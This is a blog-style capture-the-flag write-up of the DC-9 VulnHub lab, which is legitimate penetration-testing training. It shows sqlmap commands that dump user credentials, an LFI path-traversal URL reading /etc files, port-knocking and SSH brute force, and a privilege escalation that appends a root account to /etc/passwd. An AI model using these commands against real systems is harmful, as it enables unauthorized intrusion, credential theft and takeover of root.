---
layout: default
title : muzec - DC 9 Writeup
---

DC-9 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.

The ultimate goal of this challenge is to get root and to read the one and only flag.

[Download DC 9 Here](https://www.vulnhub.com/entry/dc-9,412/) .

![image](https://user-images.githubusercontent.com/69868171/120352900-3f3e5300-c2cf-11eb-8a39-639c9dfa8921.png)

We always start with an nmap scan.....

```Nmap -sC -sV -oA nmap <Target-IP>```

```
# Nmap 7.91 scan initiated Tue Jun  1 07:26:38 2021 as: nmap -sC -p- -sV -oA nmap 172.16.139.197
Nmap scan report for 172.16.139.197
Host is up (0.0030s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Example.com - Staff Details - Welcome

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jun  1 07:26:48 2021 -- 1 IP address (1 host up) scanned in 9.69 seconds
```

We are having HTTP port only let hit it not going to waste to much of time here have a lot to do.

![image](https://user-images.githubusercontent.com/69868171/120353554-bffd4f00-c2cf-11eb-9293-6d4112a1b911.png)

A login page so i try some basic SQL injection on the login page but not luck so i decided to try the search form and luck us we hit a jackpot so let intercept the search request with burp.

![image](https://user-images.githubusercontent.com/69868171/120355372-3e0e2580-c2d1-11eb-98bb-7ed30969d0a5.png)

Now let save it in a txt file.

![image](https://user-images.githubusercontent.com/69868171/120356020-e2906780-c2d1-11eb-9aee-5e744f60cf4c.png)

`sqlmap -r scan.txt --dbs --columns`

![image](https://user-images.githubusercontent.com/69868171/120356610-8417b900-c2d2-11eb-9720-3b3219ad6d3b.png)

`sqlmap -r scan.txt -D Staff -T Users -C Username --dump`

![image](https://user-images.githubusercontent.com/69868171/120357413-6ac33c80-c2d3-11eb-829a-32390ea34f53.png)

Now let do the same thing for the password.

`sqlmap -r scan.txt -D Staff -T Users -C Password --dump`

![image](https://user-images.githubusercontent.com/69868171/120358453-7e22d780-c2d4-11eb-8393-ac0cb765af7a.png)

Now let crack the password hash we just obtain.

![image](https://user-images.githubusercontent.com/69868171/120359046-3d778e00-c2d5-11eb-820b-912232c74e38.png)

Boom we have credential now let log in with `admin` and  `transorbital1` .

![image](https://user-images.githubusercontent.com/69868171/120359237-7152b380-c2d5-11eb-9731-06487f3122ba.png)

And we are in but the `	File does not exist` look strange is it trying to tell us we have some active parameter that can lead to LFI maybe or maybe not let try it.

![image](https://user-images.githubusercontent.com/69868171/120359717-ffc73500-c2d5-11eb-8936-25b467fe814b.png)

Boom we are right it a parameter that lead to LFI vulnerability so checking all files with the LFI i found some interesting file `http://172.16.139.198/manage.php?file=../../../../../../../../../../etc/knockd.conf` .

![image](https://user-images.githubusercontent.com/69868171/120362497-23d84580-c2d9-11eb-9231-30a67cf6a32d.png)

We use the knock command for the Port Knocking. This can be done by a bunch of different methods. After Knocking the ports in the sequence, we ran the NMAP scan again to ensure that our knocking worked and SSH Port should be open now. We have the SSH port open. This is our way in.

```
knock 172.16.139.198 7469 8475 9842
nmap -p22 172.16.139.198
```

![image](https://user-images.githubusercontent.com/69868171/120362994-aa8d2280-c2d9-11eb-854b-35ca5dc7d5c5.png)

Now we have SSH open since we found some password in the database we dump recently and we have all the users in the `/etc/passwd` file we just read with the LFI let try to brute force for SSH with it.

![image](https://user-images.githubusercontent.com/69868171/120363466-2f783c00-c2da-11eb-8570-b3421f9fc98f.png)

Good we have credential for SSH now let log in.

![image](https://user-images.githubusercontent.com/69868171/120363695-6fd7ba00-c2da-11eb-9531-006b15241862.png)

We are in let enumerate.

![image](https://user-images.githubusercontent.com/69868171/120364192-ee345c00-c2da-11eb-9381-1e766e13d06d.png)

A secret directory with a passwordlist again cool let hit SSH again.

![image](https://user-images.githubusercontent.com/69868171/120364494-4f5c2f80-c2db-11eb-98f5-7ea089f56c61.png)

Nice think we find our way to root.

![image](https://user-images.githubusercontent.com/69868171/120364590-7286df00-c2db-11eb-99f8-c150c6ff8c45.png)

### Privilege Escalation

Seems we can a command on sudo ` /opt/devstuff/dist/test/test` cool now let get root.

![image](https://user-images.githubusercontent.com/69868171/120366219-68fe7680-c2dd-11eb-94dd-ea8489261865.png)

```
openssl passwd -1 -salt muzec 123456
echo 'muzec:$1$muzec$neJaym5k6ebVFUW/P2iMd/:0:0::/root:/bin/bash' >> /tmp/muzec
sudo /opt/devstuff/dist/test/test /tmp/muzec /etc/passwd
su muzec
123456
```

![image](https://user-images.githubusercontent.com/69868171/120366031-28066200-c2dd-11eb-91d1-1ddab67cd79a.png)

Boom we are root and done let get the flag.

![image](https://user-images.githubusercontent.com/69868171/120366105-3fdde600-c2dd-11eb-8a5e-236a0d09bf95.png)

Greeting From [Muzec](https://twitter.com/muzec_saminu)

<br> <br>
[Back To Home](../index.md)
<br>
